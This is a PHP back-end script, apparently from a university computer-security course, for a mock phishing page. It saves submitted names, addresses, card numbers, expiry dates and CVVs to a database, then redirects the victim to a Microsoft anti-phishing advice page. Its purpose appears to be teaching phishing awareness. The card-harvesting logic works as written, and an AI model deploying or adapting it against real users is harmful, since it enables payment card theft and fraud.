<?php
// Insert Order Script
include '../ukfIG2_Koncepty_pocitacovej_bezpecnosti-PHISHING_STRANKA/database.php'; // Include database connection

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Sanitize and collect form data
    $full_name = $conn->real_escape_string(trim($_POST['firstname']));
    $email = $conn->real_escape_string(trim($_POST['email']));
    $address = $conn->real_escape_string(trim($_POST['address']));
    $city = $conn->real_escape_string(trim($_POST['city']));
    $state = $conn->real_escape_string(trim($_POST['state']));
    $zip_code = $conn->real_escape_string(trim($_POST['zip']));
    $card_name = $conn->real_escape_string(trim($_POST['cardname']));
    $card_number = $conn->real_escape_string(trim($_POST['cardnumber']));
    $exp_month = $conn->real_escape_string(trim($_POST['expmonth']));
    $exp_year = $conn->real_escape_string(trim($_POST['expyear']));
    $cvv = $conn->real_escape_string(trim($_POST['cvv']));
    $same_address = isset($_POST['sameadr']) ? 1 : 0; // Convert to integer

    // Prepare the SQL insert statement
    $sql = "INSERT INTO credit_card (full_name, email, address, city, state, zip_code, card_name, card_number, exp_month, exp_year, cvv, same_address) VALUES ('$full_name', '$email', '$address', '$city', '$state', '$zip_code', '$card_name', '$card_number', '$exp_month', '$exp_year', '$cvv', '$same_address')";

    // Execute the query
    if ($conn->query($sql) === TRUE) {
        echo "New order created successfully.";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    // Close the database connection
    $conn->close();
    header("Location: https://support.microsoft.com/en-us/windows/protect-yourself-from-phishing-0c7ea947-ba98-3bd9-7184-430e1f860a44");

} else {
    echo "Invalid request method.";
}
?>
